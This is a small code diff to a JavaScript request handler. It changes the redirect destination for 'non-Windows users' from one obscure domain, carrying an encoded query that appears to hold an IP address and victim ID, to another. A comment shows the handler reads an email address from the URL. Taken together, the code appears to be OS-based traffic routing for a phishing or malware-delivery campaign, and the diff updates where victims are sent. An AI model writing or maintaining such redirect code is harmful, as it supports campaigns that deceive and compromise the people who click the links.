@@ -7,7 +7,7 @@ export default function handler(req, res) {
 
   // Base URL for non-Windows users
   const NON_WINDOWS_TARGET =
-    'https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=';
+    'https://wavemarkmx.com/ms';
 
   //--------------------------------------------------------------------
   // 1. Try to read query normally: ?email= or ?smn=
